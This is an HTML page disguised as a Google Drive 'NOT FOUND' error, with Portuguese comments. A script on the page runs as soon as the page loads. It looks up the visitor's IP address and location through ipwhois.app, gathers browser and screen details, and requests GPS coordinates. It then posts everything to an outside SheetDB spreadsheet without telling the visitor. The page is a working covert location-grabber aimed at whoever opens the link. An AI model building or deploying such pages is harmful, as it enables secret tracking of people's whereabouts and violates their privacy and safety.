<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Google Drive</title>
</head>
<body>
<h1>Error: NOT FOUND</h1>

<script>
async function getIPandLocation() {
  try {
    const response = await fetch('https://ipwhois.app/json/');
    const data = await response.json();
    return {
      country: data.country,
      region: data.region,     
      city: data.city,         
      postal: data.postal,     
      lat_ip: data.latitude,      // lat pelo IP
      lon_ip: data.longitude,     // lon pelo IP
      ip: data.ip              
    };
  } catch(e) {
    console.error('Erro ao obter IP/localização:', e);
    return {};
  }
}

function getBrowserInfo() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    timestamp: new Date().toISOString()
  };
}

async function sendDataToSheet(collectedData) {
  const sheetDbUrl = 'https://sheetdb.io/api/v1/eu5qmx1222j2g';
  try {
    const response = await fetch(sheetDbUrl, {
      method: 'POST',
      headers: { 
        'Accept': 'application/json',
        'Content-Type': 'application/json' 
      },
      body: JSON.stringify({
        data: [collectedData]
      })
    });
    const result = await response.json();
    console.log('Resposta SheetDB:', result);
  } catch(e) {
    console.error('Erro ao enviar ao SheetDB:', e);
  }
}

async function main() {
  const ipLocationData = await getIPandLocation();
  const browserData = getBrowserInfo();

  // Adicione os campos para lat/lon GPS do browser, se disponível
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition((pos) => {
      const collectedData = {
        ...ipLocationData,
        lat_browser: pos.coords.latitude,
        lon_browser: pos.coords.longitude,
        ...browserData
      };
      console.log('Dados coletados (com GPS navegador):', collectedData);
      sendDataToSheet(collectedData);
    }, (error) => {
      console.warn('Geolocalização do navegador negada ou falhou:', error.message);
      // Sem GPS, envia só IP e dados do browser
      const collectedData = {...ipLocationData, ...browserData};
      sendDataToSheet(collectedData);
    });
  } else {
    // Navegador não suporta geolocalização
    const collectedData = {...ipLocationData, ...browserData};
    sendDataToSheet(collectedData);
  }
}

main();
</script>

</body>
</html>
